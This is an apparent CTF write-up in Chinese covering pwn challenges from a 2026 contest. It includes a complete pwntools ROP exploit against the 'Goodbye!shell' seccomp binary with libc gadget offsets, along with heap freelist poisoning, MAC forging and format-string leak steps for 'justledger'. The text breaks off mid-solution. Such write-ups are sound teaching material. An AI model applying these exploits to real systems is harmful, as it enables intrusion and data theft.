---
title: 【微信】2026 年“羊城杯”网络安全大赛初赛-简单pwn-RE
source: https://mp.weixin.qq.com/s/iYMM1gYBw-ZMAsj3nqkn-g
source_host: mp.weixin.qq.com
clip_date: 2026-10-24T20:14:34+08:00
trace_id: 891506d4-0791-4bb3-9ae1-6153216c0044
content_hash: 0675363cf0bf9e71078461c4a68727545f51eace189e1abd6b6e06e05174104b
status: synced
tags:
  - 微信
  - CTF
  - 模拟执行
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 三道羊城杯初赛题分别靠可写页铺 ROP 读 flag、劫持 SQL 扩展跨进程 ORW、逆推 VMC2 字节码，拿到三面 flag。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40375244-d011-8144-99b7-fd09c47e30eb
ioc:
  cves: []
  cwes: []
  hashes:
    - 264a55799c263c6c1ba3789acd3b7b07bc15e4c7ecccfce6351012872057f8fb
    - 5cf34b2ed4cad69824d7ba04495867151eae6c91a215b24fd430edd1ab92ff13
    - "73964108416405455270947152546853"
    - 9042615cd495e6262019b1fe02aac1b74422a91a5195a3b1dd39633f67c05bc6
    - "92875846957195623110612840554366"
    - b2cf6c33b74d2f22543b7a469a75b538911e690f769d0b238843a49465b83793
    - bf23c7494623d0452ce762a5efe9a756a3f500ca2d151dc04188e24c6f6a4c72
    - c9ea48c64357bb5ec0b08084701d49e3f8513e1befad7560671d90fa0261ca8e
    - cc222acda86a869ae53d4fe1c0144a54190f756e4ecd170bedbb7deac5ae2c16
    - f5a7fc236f80f3185608d14e9f4dea3e3fd647582e123e8a00f253629fe16830
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 三道羊城杯初赛题分别靠可写页铺 ROP 读 flag、劫持 SQL 扩展跨进程 ORW、逆推 VMC2 字节码，拿到三面 flag。
> 
> - **Goodbye!shell 的入口条件：** `read(0, rbp-0x20, 0x30)` 只多出 0x10 字节，正好盖住保存的 rbp 与返回地址；seccomp 默认放行，仅 KILL `execve`(59)/`execveat`(322)，故目标是读文件而非 get shell。利用页为 `0x404000–0x405000`，反复从 `0x40122b` 进入作 0x30 字节写原语，把 `seccomp_load@GOT` 改成 `endbr64; ret`，走出 `write(1, write@GOT, 9)` 泄漏 `write`（libc 偏移 `0x1149c0`），再在 BSS 上跑 `openat/read/write/exit`；`AT_FDCWD=-100` 需用 32 位 `xchg eax, edi` 清高位，否则 fd 非法。
> 
> - **justledger 的三级穿透：** 同一 SQL 里两次调用 `ledger_seed()` 才能让 `ledger_bind` 看到活指针；kind 1 对象 `+0x30` 存 `func ^ cookie ^ ror(self, 12)`，据此还原 probe 的 PIE 与 cookie；freelist 弹出式为 `next = *obj ^ (obj >> 12)`，投毒到 `pie+0x5110` 使 `ledger_fire` 跳进 probe 的发送代理；WINDOW 只比较 `offset+size` 低字节，`0x100+0x110` 可越界读到相邻 ROUTE，按 `+0x10/+0x18` 重算可跳到 broker 通往 vault 的代理；vault `0x91` 的 `%1$p…%5$p` 泄漏 canary、`read`、flag_fd=9，`0xA7` 用长度 `0x200`（低字节 0）绕过检查后 ROP 读已打开的 flag。
> 
> - **VVMM 的 VM 逆向：** VMC2 容器两个入口，入口 0 魔数为 `0xbadf00d` 是陷阱，入口 1 才是 2462 条真指令；指令 8 字节（op/reg/reg/字节/imm32），解密每步 `stream += 0x045D9F3B` 后做三段异或乘法；输入固定 31 字节，经逐字节 XOR/ADD/ROL/STAGE 后做 7 轮就地混合（邻居 `i+1`、`i+7` mod 31）。逆推从 31 个 `CMPI8` 常量出发，因 `STAGE` 非单射需按 0..255 枚举首个逆像，得 `flag{J1nxI_i5_4_6eautiful_g1rl}`，与原程序 `--run` 同为 2460 步、停于 `0x4ce0`。
> 
> - **共性教训：** 三题都靠"检查只看部分字节/部分状态"绕过——低字节长度比较、无 PIE 的固定地址、被动打开的 flag fd，说明沙箱只杀 `execve` 不等于无法取数。

**玄网安全** *2026年10月24日 20:02*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/587b96e0f2b9a3e7.jpg)

## Goodbye!shell

> 核心思路： `read` 只溢出保存的 `rbp` 和返回地址，用同一段 `read; write("Goodbye!s"); leave; ret` 把数据铺到可写页，再借 `seccomp_load` 的调用泄漏 `write` ，最后在该页上做 `openat/read/write` 。

## 1\. 题目说明

第 5 行

题目提示是「进来道个别吧，只是这一次，shell 可能不会回应你了。」附件为未剥离的 `pwn` 、 `libc.so.6` 、 `ld-linux-x86-64.so.2` 和 `libseccomp.so.2` 。本次实例：

-   连接： `1.14.76.59:21909` （平台映射 `nc/9999` ）
    
-   `pwn` SHA256： `c9ea48c64357bb5ec0b08084701d49e3f8513e1befad7560671d90fa0261ca8e`
    
-   `libc.so.6` SHA256： `b2cf6c33b74d2f22543b7a469a75b538911e690f769d0b238843a49465b83793`
    

`pwn` 是 x86-64 ET_EXEC，加载基址 `0x400000` ，解释器为 `/lib64/ld-linux-x86-64.so.2` ，由 Ubuntu gcc 11.4.0 编译。 `libc.so.6` 的版本字符串是 `Ubuntu GLIBC 2.35-0ubuntu3.15` 。程序没有源码，下面的控制流都来自 `objdump` 。

`main` 先调用 `sandbox` ，再写出 19 字节的 `Give me your name:` ，然后进入 `vuln` ：

```yaml
4011c2:  mov    edi,0x7fff0000
4011c7:  call   seccomp_init@plt
4011d9:  mov    edx,0x3b          ; execve
4011de:  mov    esi,0x0           ; SCMP_ACT_KILL
4011eb:  call   seccomp_rule_add@plt
4011f9:  mov    edx,0x142         ; execveat
4011fe:  mov    esi,0x0
40120b:  call   seccomp_rule_add@plt
401210:  mov    rax,QWORD PTR [rbp-0x8]
401214:  mov    rdi,rax
401217:  call   seccomp_load@plt
40121d:  leave
40121e:  ret

401227:  sub    rsp,0x20
40122b:  lea    rax,[rbp-0x20]
40122f:  mov    edx,0x30
401237:  mov    edi,0x0
40123c:  call   read@plt
401241:  mov    edx,0x9
401246:  lea    rax,[rip+0xdb7]   ; "Goodbye!s"
40124d:  mov    rsi,rax
401250:  mov    edi,0x1
401255:  call   write@plt
40125b:  leave
40125c:  ret
```

`0x7fff0000` 是 `SCMP_ACT_ALLOW` ， `esi = 0` 是 `SCMP_ACT_KILL` 。沙箱默认放行，只杀死 `execve` （59）和 `execveat` （322）。 `openat` 、 `read` 、 `write` 、 `exit` 不受影响，所以目标是读出工作目录里的 `flag` ，而不是拿 shell。

## 2\. 解题思路

保护可以从程序头直接读出来：ET_EXEC，没有 PIE； `GNU_STACK` 只有 `RW` ，栈不可执行； `vuln` 里没有 canary； `GNU_RELRO` 覆盖 `0x403e00` 起的 `0x200` 字节，`.got.plt` 在 `0x404000` ，是 Partial RELRO。函数入口都有 `endbr64` ，间接调用的落点必须带 `endbr64` 才经得起 IBT。远程最终能靠普通 `ret` 链跑完，说明这个实例没有用 SHSTK 挡住返回地址。

溢出只有 `0x10` 字节。 `vuln` 在 `rbp-0x20` 放了 `0x20` 字节缓冲区，却 `read` 了 `0x30` 字节，多出来的正好是保存的 `rbp` 和返回地址。二进制里没有 `pop rdi` 、 `pop rsi` 、 `pop rdx` 、 `pop rax` 和 `syscall` ，一次返回做不了系统调用。

可写页补上了这块空间。唯一的 RW LOAD 虚拟地址 `0x403e00` 、文件大小 `0x250` 、内存大小 `0x258` 。加载器按页映射后， `0x403e00–0x404000` 被 RELRO 改成只读， `0x404000–0x405000` 仍可写。文件大小只到 `0x404050` ，BSS 只清到 `0x404058` ，这一页余下的字节仍是文件尾（`.symtab` 、`.strtab` 等节名）。 `0x404058` 之后都可以当草稿纸，只要别盖掉还要用的 `write@GOT` 。

利用分两段：

1.  反复从 `0x40122b` 进入，每次向指定地址写 `0x30` 字节，把路径、跳板和泄漏帧铺到这一页。
    
2.  把 `seccomp_load@GOT` 改成 `endbr64; ret` ，走到 `0x401210` ，让 `rax` 变成 `write@GOT` 的地址，再用 `0x40124d` 把 GOT 上的 8 字节地址打出来。加上 libc 里的 `syscall; ret` ，执行 `openat/read/write/exit` 。
    

## 3\. 解题过程

### 3.1 把 0x30 字节读做成写入原语

`0x40122b` 到 `leave; ret` 的行为只由当前 `rbp` 决定：

-   `read(0, rbp-0x20, 0x30)` 写入 32 字节数据和下一帧的 `rbp` 、 `rip`
    
-   随后固定 `write(1, "Goodbye!s", 9)`
    
-   `leave; ret` 切到刚才写入的下一帧
    

因此第一发从真实栈溢出时，只要把保存的 `rbp` 指到目标地址加 `0x20` ，返回地址设为 `0x40122b` ，后面每一次输入都是同一格式。 `read` 和 `write` 的 glibc 包装在进入内核前不改第三个参数，内核也保留 `rdx` ，所以每轮问候之后 `rdx` 仍是 9。这个值后面用来控制泄漏长度。

一轮写入会覆盖 `[rbp-0x20, rbp+0x10)` 。上一帧还没返回时，它的返回槽在 `prev+8` ，不能落进这一窗口，所以连续两个读帧至少错开 `0x30` 字节。脚本里用 `check_gap` 检查这件事。

懒绑定也会占栈。泄漏之后第一条真正的链还要经过 `read` 的解析器， `_dl_runtime_resolve_xsave` 的栈帧远大于普通 `read` 。路径、跳板和 ROP 链放在 `0x404080–0x404420` ，解析器使用的高地址帧放在 `0x404c00` 以上，两边不重叠。

这一页上的分工：

| 地址  | 内容  |
| --- | --- |
| `0x404028` | `write@GOT`<br><br>，泄漏前不能改 |
| `0x404030` | `seccomp_load@GOT`<br><br>，改成 `0x401100` |
| `0x404038` | `read@GOT`<br><br>，改成 PLT 桩 `0x401070` ，保证后续还能解析 `read` |
| `0x404080` | 4 块跳板，每块指向下一段 ROP |
| `0x404180` | 字符串 `flag\x00` |
| `0x404300` | 9 段、每段 `0x20` 字节的最终系统调用链 |
| `0x404600` | 读 flag 的缓冲区 |
| `0x404c00`<br><br>起 | 间隔 `0x40` 的中转帧 |
| `0x404e00/0x404e40/0x404e80` | 进入泄漏原语的三帧 |

跳板本身也得用这个 0x30 字节原语写进去。中转帧先落到高地址，再回头写低地址的跳板，避免正在执行的返回槽被下一次 `read` 盖掉。泄漏前共 13 次 `read` ：1 次初始溢出、3 次中转、1 次路径、4 次跳板、3 次泄漏帧。

### 3.2 用 seccomp_load 泄漏 write

二进制里没有方便的寄存器 gadget，泄漏借的是 `sandbox` 尾部现成的指令。先在 `rbp = 0x404050` 的那一次写入里把 GOT 改成：

-   `0x404030 = 0x401100` ，即 `_dl_relocate_static_pie` 的 `endbr64; ret`
    
-   `0x404038 = 0x401070` ，即 `read` 的 `.plt` 桩（ `endbr64; push 4; jmp resolver` ）
    

`0x401100` 不能换成裸 `ret` 。 `0x401217` 的 `call seccomp_load@plt` 最终是间接跳转，IBT 要求目标以 `endbr64` 开头。

随后 `leave` 到 `0x404e00` 。这一帧再 `leave; ret` 到 `0x401210` ，此时 `rbp = 0x404e40` ，而 `[rbp-8]` 事先写成了 `0x404028` ：

```
401210:  mov    rax,QWORD PTR [rbp-0x8]   ; rax = 0x404028
401214:  mov    rdi,rax
401217:  call   seccomp_load@plt          ; GOT 已是 endbr64; ret，rax 不变
40121d:  leave                            ; 下一帧 rbp = 0x404e80，rip = 0x40124d
40124d:  mov    rsi,rax                   ; rsi = write@GOT
401250:  mov    edi,0x1
401255:  call   write@plt                  ; rdx 仍是 9
```

于是输出是 `write(1, 0x404028, 9)` 。前 8 字节是 `write` 的真实地址，第 9 字节是旁边 `seccomp_load@GOT` 的低字节，丢掉即可。

欢迎语 19 字节，13 轮各打印 9 字节 `Goodbye!s` ，再加 9 字节泄漏，一共 145 字节。本次连接解出：

-   `write = 0x7f07908899c0`
    
-   libc 基址 = `write - 0x1149c0 = 0x7f0790775000`
    

`0x1149c0` 是这份 libc 里 `write` 的文件偏移，脚本启动时用 `libc.sym["write"]` 读取。

### 3.3 在可写页上执行 openat/read/write

libc 2.35 里用到的文件偏移：

| gadget | 偏移  | 字节  |
| --- | --- | --- |
| `pop rdi; ret` | `0x2a3e5` | `5f c3` |
| `pop rsi; ret` | `0x2be51` | `5e c3` |
| `pop rdx; pop rbx; ret` | `0x90469` | `5a 5b c3` |
| `pop rax; ret` | `0x45eb0` | `58 c3` |
| `syscall; ret` | `0x912d6` | `0f 05 c3` |
| `xchg eax, edi; ret` | `0x15bfd5` | `97 c3` |

链的第一项是占位用的 saved `rbp` 。后面依次是：

```
openat(AT_FDCWD, 0x404180, O_RDONLY)    ; rax = 257
xchg eax, edi                           ; 32 位写 rdi，高 32 位清零，rdi = fd
read(fd, 0x404600, 0x80)                ; rax = 0
write(1, 0x404600, 0x80)                ; rax = 1
exit(0)                                 ; rax = 60
```

`AT_FDCWD` 是 `-100` ，高 32 位全是 1。这里必须用 32 位的 `xchg eax, edi` ：32 位结果写回寄存器时会把 `rdi` 的高位清掉，fd 才是合法的小整数。若换成 64 位交换， `rdi` 会变成 `0xffffffff00000000 | fd` ， `read` 会失败。

整条链 35 个 qword，280 字节，补齐到 9 个 `0x20` 字节块。每一块仍用 `0x40122b` 写入；块与块之间通过 `0x404080` 的跳板做 `leave; ret` 。9 次写入会再打印 9 个 `Goodbye!s` ，然后系统调用把 flag 写到标准输出。

`read` 长度固定 `0x80` ，flag 没有这么长，也不会把缓冲区剩下的字节清零。所以 flag 后面紧跟着这一页里原有的节名字符串，那些字节不属于 flag。

## 4\. 完整解题脚本

把附件里的 `pwn` 和 `libc.so.6` 放在当前目录。脚本用它们核对 gadget，并向 `1.14.76.59:21909` 发送两段 payload。

```php
#!/usr/bin/env python3
"""Goodbye!shell

seccomp kills execve/execveat only. The bug is a 0x10-byte overflow
(saved rbp + rip) in read(0, buf, 0x30), so the chain is staged through
that same gadget and pivoted onto a BSS ROP of openat/read/write.
"""
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

READ = 0x40122B
LEAVE = 0x40121D
LOAD = 0x401210
W9 = 0x40124D
ENDBR_RET = 0x401100
PLT_READ = 0x401070

assert elf.read(ENDBR_RET, 5) == b"\xf3\x0f\x1e\xfa\xc3"

POP_RDI = 0x2A3E5
POP_RSI = 0x2BE51
POP_RDX_RBX = 0x90469
POP_RAX = 0x45EB0
SYSCALL = 0x912D6
XCHG_EAX_EDI = 0x15BFD5
WRITE_OFF = libc.sym["write"]

assert libc.read(POP_RDI, 2) == b"\x5f\xc3"
assert libc.read(POP_RSI, 2) == b"\x5e\xc3"
assert libc.read(POP_RDX_RBX, 3) == b"\x5a\x5b\xc3"
assert libc.read(POP_RAX, 2) == b"\x58\xc3"
assert libc.read(SYSCALL, 3) == b"\x0f\x05\xc3"
assert libc.read(XCHG_EAX_EDI, 2) == b"\x97\xc3"

PATH = 0x404180
BUF = 0x404600
CHAIN = 0x404300
TBASE = 0x404080          # below the resolver scratch
L = 0x404E40              # LOAD frame
W = 0x404E80              # frame used by the 9-byte write gadget
HIGH2 = 0x404E00          # leave target that enters LOAD


def check_gap(prev, cur, what):
    if prev is None:
        return
    slot = prev + 8
    lo, hi = cur - 0x20, cur + 0x10
    if lo <= slot < hi:
        raise SystemExit(f"overlap {what}: prev={prev:#x} cur={cur:#x}")


def build_chain(base):
    def g(off):
        return base + off

    q = [
        0,
        g(POP_RDI), 0xFFFFFFFFFFFFFF9C,
        g(POP_RSI), PATH,
        g(POP_RDX_RBX), 0, 0,
        g(POP_RAX), 257,
        g(SYSCALL),
        g(XCHG_EAX_EDI),
        g(POP_RSI), BUF,
        g(POP_RDX_RBX), 0x80, 0,
        g(POP_RAX), 0,
        g(SYSCALL),
        g(POP_RDI), 1,
        g(POP_RSI), BUF,
        g(POP_RDX_RBX), 0x80, 0,
        g(POP_RAX), 1,
        g(SYSCALL),
        g(POP_RAX), 60,
        g(POP_RDI), 0,
        g(SYSCALL),
    ]
    raw = b"".join(p64(x) for x in q)
    if len(raw) % 0x20:
        raw += b"\x00" * (0x20 - (len(raw) % 0x20))
    return raw


def main():
    n = len(build_chain(0)) // 0x20
    log.info("%d chain chunks", n)

    def chunk_rbp(i):
        return CHAIN + i * 0x20 + 0x20

    def t_addr(i):
        # enters chunk i, i >= 1
        return TBASE + (i - 1) * 0x10

    tramp = b"".join(p64(chunk_rbp(i)) + p64(READ) for i in range(1, n))
    assert len(tramp) % 0x20 == 0, len(tramp)
    blocks = [tramp[i:i + 0x20] for i in range(0, len(tramp), 0x20)]
    nb = len(blocks)
    log.info("%d trampoline blocks @ %#x", nb, TBASE)

    # One leave-bounce per block after the first. 0x40 apart so a writer's
    # control qword does not land on the next bounce frame.
    bounce = [0x404C00 + i * 0x40 for i in range(nb - 1)]

    stages = []  # (name, rbp, blob)

    def add(name, rbp, data, next_rbp, next_rip, prev):
        check_gap(prev, rbp, name)
        blob = data.ljust(0x20, b"\x00") + p64(next_rbp) + p64(next_rip)
        assert len(blob) == 0x30
        stages.append((name, rbp, blob))
        log.info("%-8s rbp=%#x -> %#x / %#x", name, rbp, next_rbp, next_rip)
        return rbp

    prev = None
    # Bounce frames first (high, entered from the real stack).
    for k, baddr in enumerate(bounce):
        reader = TBASE + (k + 1) * 0x20 + 0x20
        writer = baddr + 0x20
        if k + 1 < len(bounce):
            nxt, nrip = bounce[k + 1] + 0x20, READ
        else:
            nxt, nrip = 0x4041A0, READ  # path
        prev = add(f"bnc{k}", writer, p64(reader) + p64(READ), nxt, nrip, prev)

    if not bounce:
        path_prev = None
    else:
        path_prev = prev

    prev = add("path", 0x4041A0, b"flag\x00", TBASE + 0x20, READ, path_prev)

    for bi, block in enumerate(blocks):
        reader = TBASE + bi * 0x20 + 0x20
        if bi == 0:
            entered_from = 0x4041A0
        else:
            entered_from = bounce[bi - 1]
        if bi + 1 < nb:
            nxt, nrip = bounce[bi], LEAVE
        else:
            nxt, nrip = 0x404E58, READ  # L writer
        prev = add(f"tr{bi}", reader, block, nxt, nrip, entered_from)

    prev = add(
        "L",
        0x404E58,
        p64(0x404028) + p64(W) + p64(W9),
        0x404EA0,
        READ,
        prev,
    )
    prev = add(
        "W",
        0x404EA0,
        p64(chunk_rbp(0)) + p64(READ),
        0x404E20,
        READ,
        prev,
    )
    prev = add(
        "H2",
        0x404E20,
        p64(L) + p64(LOAD),
        0x404050,
        READ,
        prev,
    )
    prev = add(
        "got",
        0x404050,
        p64(ENDBR_RET) + p64(PLT_READ),
        HIGH2,
        LEAVE,
        prev,
    )

    payloads = [b"A" * 0x20 + p64(stages[0][1]) + p64(READ)]
    payloads += [blob for _, _, blob in stages]
    log.info("%d pre-leak reads", len(payloads))

    io = remote("1.14.76.59", 21909)
    io.send(b"".join(payloads))
    need = 19 + 9 * len(payloads) + 9
    blob = io.recvn(need, timeout=5)
    log.info("got %d bytes (wanted %d)", len(blob), need)
    if len(blob) < need:
        log.info("partial %r", blob)
        log.info("rest %r", io.recvrepeat(0.5))
        return
    write_addr = u64(blob[-9:-1])
    log.success("write %#x", write_addr)
    base = write_addr - WRITE_OFF
    log.success("libc %#x", base)

    real = build_chain(base)
    chunks = [real[i:i + 0x20] for i in range(0, len(real), 0x20)]
    assert len(chunks) == n
    cooked = []
    for i, ch in enumerate(chunks):
        if i + 1 < n:
            nxt, nrip = t_addr(i + 1), LEAVE
        else:
            nxt, nrip = CHAIN, LEAVE
        src = W if i == 0 else t_addr(i)
        check_gap(src, chunk_rbp(i), f"chunk{i}")
        cooked.append(ch + p64(nxt) + p64(nrip))
    io.send(b"".join(cooked))
    data = io.recvrepeat(2)
    log.info("result %r", data)


if __name__ == "__main__":
    main()
```

```
DASCTF{73964108416405455270947152546853}
```

## justledger

> 核心思路：用 SQL 扩展把 `ledger_fire` 劫持到 probe 代理，再经 broker 的窗口越界伪造 ROUTE 调用，进入 vault 后用格式化字符串泄漏，最后在 `0xA7` 上做 ORW。

## 1\. 题目说明

题目给出一组剥离符号的程序和固定运行库。结算流程穿过一个 SQLite 原生扩展，以及两个互相隔离的二进制记录服务。目标是从远程服务读出动态 flag。

题目说明原文：

```
justledger

Settlement crosses a native SQLite extension and two isolated binary-record services. Recover the dynamic DASCTF flag from the supplied stripped binaries and fixed runtime libraries.
```

远程映射是 `nc/9999 -> 1.14.76.59:17371` 。连上后先收到一行 `justledger\n` ，之后按行发送 SQL，服务把结果字节再编码成十六进制，形如 `ROW <hex>\nOK\n` 。整数 `1` 因此显示为 `ROW 31` ，失败的空结果是 `ROW -` 。

附件里实际参与利用的文件及 SHA256：

```
9042615cd495e6262019b1fe02aac1b74422a91a5195a3b1dd39633f67c05bc6  justledger
5cf34b2ed4cad69824d7ba04495867151eae6c91a215b24fd430edd1ab92ff13  ledgerprobe.so
bf23c7494623d0452ce762a5efe9a756a3f500ca2d151dc04188e24c6f6a4c72  ledgerbroker
264a55799c263c6c1ba3789acd3b7b07bc15e4c7ecccfce6351012872057f8fb  ledgervault
b2cf6c33b74d2f22543b7a469a75b538911e690f769d0b238843a49465b83793  libc.so.6
f5a7fc236f80f3185608d14e9f4dea3e3fd647582e123e8a00f253629fe16830  libsqlite3.so.0
```

`libc.so.6` 是 Ubuntu GLIBC 2.35-0ubuntu3.15，SQLite 是 3.37.2。四个业务程序都是 PIE，带栈 canary，数据段是部分 RELRO。broker 和 vault 安装了 seccomp 黑名单，禁止 `execve` 、 `execveat` 、 `open` 、 `openat` 、 `openat2` 、 `creat` 、 `socket` 、 `connect` 、 `socketpair` 。 `read` 和 `write` 仍然允许。flag 在 vault 启动时已经打开，路径是 `/home/ctf/flag` ，不能再自己 `open` 。

进程关系：listener 拉起 `justledger` ，并把 broker 套接字放在 fd 3。broker 的 `--serve` 子进程把 vault 套接字放在 fd 3。vault 每次 accept 后重新 exec `--serve` ，把客户端套接字 dup 到 fd 0 和 fd 1，再随机打开若干次 `/dev/null` ，最后打开 flag。flag 的 fd 必须大于 3。

## 2\. 解题思路

`justledger` 本身没有直接读 flag 的路径。扩展 `ledgerprobe.so` 在绑定成功后可以分配对象、审计对象、改 freelist，并让 `ledger_fire` 跳到 BSS 上的函数指针。那个指针被改成 probe 里的字节转发循环后，客户端就直接面对 broker。

broker 的 WINDOW 读写只检查 `offset + size` 的低字节。相邻的 ROUTE 对象因此可以被越界读出，再按它自己的 MAC 和哈希把调用目标改成 broker 里通向 vault 的代理。vault 的 `0x91` 把 cookie、canary、 `read` 地址和 flag fd 混进 `__dprintf_chk` 的参数； `0xA7` 在通过低字节长度检查后溢出到返回地址。ROP 对已经打开的 flag fd 做 `read` ，再 `write` 到 fd 1。

## 3\. 解题过程

### 3.1 让 ledger_bind 看到两个活指针

`ledger_seed()` 返回一块指针型 `Mem` 。过滤器在 `seal = ledger_seed()` 时把这个指针记下来，同时清掉绑定标志。语句结束时 SQLite 会把寄存器复位，所以下一条语句如果只传入普通整数或 blob， `ledger_bind` 在原地址上看不到指针。

同一条语句里的两个函数结果在 `ledger_bind` 检查时还是指针型 `Mem` ，而且会落到过滤器保存的地址上：

```
SELECT * FROM ledger WHERE seal=ledger_seed();
SELECT ledger_bind(ledger_seed(), ledger_seed());
```

第一条返回 `ROW 656e747279` ，也就是文本 `entry` 。第二条返回 `ROW 31` ，也就是整数 `1` 。只给一边传 `ledger_seed()` 时返回 `ROW -` 。绑定标志位于 probe 的 `0x5464` ，后面的 `ledger_fire` 要求它非 0。

### 3.2 从 kind 1 对象推出 probe 的 PIE 和 cookie

`ledger_make(slot, 1, blob)` 分配 `0x2d8` 字节的对象。kind 为 1 时写入：

```
+0x08  递增计数
+0x20  probe + 0x1260
+0x28  对象自身地址
+0x30  func ^ cookie ^ ror(self, 12)
```

`cookie` 在 BSS `0x53f0` 。 `ledger_mark` 把对象指针存到 `0x5410` ， `ledger_audit` 从该指针 `+0x20` 读出 32 字节。因此：

```toml
func   = audit[0:8]
self   = audit[8:16]
mac    = audit[16:24]
cookie = func ^ mac ^ ror(self, 12)
pie    = func - 0x1260
```

本次远程交互得到 `pie = 0x7f70ecc6b000` ， `cookie = 0x60fd8f0074f55db1` ，对象地址 `obj = 0x5555570d3710` 。

### 3.3 投毒 freelist，让 ledger_fire 进入代理

probe 自己维护一条 freelist，头在 `0x5408` ，计数在 `0x5400` 。弹出时：

```
next = *obj ^ (obj >> 12)
```

`ledger_drop` 把对象插回头，但不清 `0x5410` 。 `ledger_touch` 向 `0x5410` 写 8 字节，所以可以在 drop 之后改写这个对象的 `next` 。

弹出后的对象会从 `+0` 清零到 `+0x2d8` 。若目标是 `pie + 0x5110` ，清零停在 `0x53e8` ， `0x53f0` 的 cookie 还在。kind 不是 0 也不是 1 时，清零之后会把调用者提供的 `0x60` 字节 blob 原样拷到对象开头。

计数必须至少为 2。否则弹出被改过的节点后计数归零，下一次 `make` 会 `malloc` ，不会弹出 `0x5110` 。顺序是：

1.  `make(0, 1)` 和 `make(1, 1)` ， `mark(1)` 后审计，得到对象 1 的地址。
    
2.  先 `drop(0)` 再 `drop(1)` 。此时头是对象 1，它的 `next` 指向对象 0。
    
3.  `touch` 写入 `target ^ (obj >> 12)` ， `target = pie + 0x5110` 。
    
4.  `make(2, 1)` 弹出对象 1，把头推进到 `0x5110` 。
    
5.  `make(3, 2, payload)` 弹出 `0x5110` 并写入 payload。
    

`ledger_fire` 要求参数个数为 0，且 `0x5464` 已置位。它计算

```
rol(ptr_5110 ^ cookie ^ 0x91e10da5c79b43f2, 0x17)
```

并与 `0x5118` 比较，通过后 `jmp [0x5110]` 。payload 前 16 字节因此是：

```
+0x00  pie + 0x1c10
+0x08  rol((pie + 0x1c10) ^ cookie ^ 0x91e10da5c79b43f2, 0x17)
```

`0x1c10` 是 probe 的转发循环：fd 0 的数据 `sendmsg` 到 fd 3，fd 3 的数据 `sendmsg` 到 fd 1。 `ledger_fire` 不再回到 SQLite。broker 在进程启动时已经把 8 字节 hello 写进套接字，所以 fire 之后第一包就是 `LBR3\x03\x00\x00\x00` 。这个值是 `0xccd49093 << 2` 。

### 3.4 越界读写 WINDOW，伪造 ROUTE 调用

broker 请求是 `u8 op | u8 slot | u16le len | body` ，应答是 `u8 status | u8 op | u16le len | data` 。用到的操作：

```
0x31  创建 WINDOW，calloc(1, 0x200)，magic 为 0x57494e444f573300
0x59  创建 ROUTE，同样 0x200 字节
0x6a  读 WINDOW
0x6b  写 WINDOW
0x7e  调用 ROUTE
```

读写从 body 里再取 `u16le offset` 和 `u16le size` 。检查是：

```
(offset + size) 的低字节 <= 0x70
offset <= 0x100
size  <= 0x600
写操作另有 size <= 0x220
```

高字节不参加比较。 `offset = 0x100` 、 `size = 0x110` 时和是 `0x210` ，低字节 `0x10` ，检查通过。实际访问地址是 `window + offset + 0x40` ，也就是 `window + 0x140` 。

`calloc(1, 0x200)` 在这份 glibc 里得到 `0x210` 的 chunk。先创建 WINDOW slot 0，再创建 ROUTE slot 0，后者的用户指针在 `window + 0x210` 。从 `window + 0x140` 读 `0x110` 字节，ROUTE 的前 `0x40` 字节落在泄漏缓冲区偏移 `0xd0` 。远程这次 `magic` 确实在 208，也就是 `0xd0` 。

ROUTE 布局：

```
+0x00  magic 0x524f555445330000
+0x08  计数 field8
+0x10  rol(func ^ self ^ cookie, 0x1d)
+0x18  splitmix64(field8 ^ field10 ^ cookie ^ 0x6f27c4b19a5e38d2)
+0x20  self
+0x28  func_1760 ^ cookie ^ ror(self, 0x11)
+0x30  pie + 0x1760
```

其中 `func_1760` 是创建时写入 `+0x30` 的地址。因此：

```
broker_pie = [+0x30] - 0x1760
cookie     = [+0x28] ^ [+0x30] ^ ror(self, 0x11)
```

调用前会用同样的 splitmix 核对 `+0x18` ，再计算

```
target = ror([+0x10], 0x1d) ^ self ^ cookie
```

要跳到 `pie + 0x2120` ，就把 `+0x10` 改成 `rol(want ^ self ^ cookie, 0x1d)` ，并按原 `field8` 重算 `+0x18` 。 `+0x00` 的 magic 和 `+0x20` 的 self 必须保持原值。

写操作使用 `offset = 0x100` 、 `size = 0x100` 。它覆盖泄漏缓冲区的前 `0x100` 字节，其中 `0xe0` 和 `0xe8` 正好是 ROUTE 的 `+0x10` 和 `+0x18` 。前面的 chunk 头原样抄回。 `0x7e` 不再分配内存，调用后也不会返回。

`pie + 0x2120` 是 broker 的另一段转发循环，把 fd 0 和 vault 所在的 fd 3 接起来。vault 的 hello 已经在缓冲区里，8 字节是 `LVL3\x01\x00\x00\x00` ，即 `0x4cd31593 << 2` 。

本次远程解出 `broker_pie = 0x7f5d30a25000` ， `cookie = 0xc9e83d0952e9a5a5` ， `self = 0x55555751d580` 。脚本用泄漏对象重算哈希，与 `+0x18` 一致后才发送伪造调用。

### 3.5 用 0x91 解出 canary、libc 和 flag fd

vault 请求是 `u8 op | u8 ignored | u16le len | body` 。 `0x91` 的长度必须在 `1..0xf0` 。格式串里 `%n` 会直接退出；允许出现的字符集是 `0123456789$#+-. *hljztL` 。 `%1$p` 这类位置参数因此合法。输出后再写 `pie + 0x2007` 的 1 字节，那个字节是 `\n` 。

`__dprintf_chk(1, 1, fmt, ...)` 的可变参数是：

```bash
%1$p  rcx = (pie + 0x1ac0) ^ cookie
%2$p  r8  = rol(cookie, 13) ^ read
%3$p  r9  = flag_fd ^ ror(cookie, 9)
%4$p        rol(cookie, 31) ^ canary
%5$p        cookie ^ 0x58df37a91c62e40b
```

`read` 是 vault 启动时 `dlsym(NULL, "read")` 的结果，在这份 libc 中偏移 `0x114920` 。反解：

```toml
cookie  = %5$ ^ 0x58df37a91c62e40b
flag_fd = %3$ ^ ror(cookie, 9)
canary  = %4$ ^ rol(cookie, 31)
read    = %2$ ^ rol(cookie, 13)
pie     = (%1$ ^ cookie) - 0x1ac0
libc    = read - 0x114920
```

本次远程格式串输出：

```
0xf3da71131b297033.0x41c737e48a68375b.0x79f9ed071d233754.0x2ff09f0d15f7cc1d.0xab0539935a0c5ef8
```

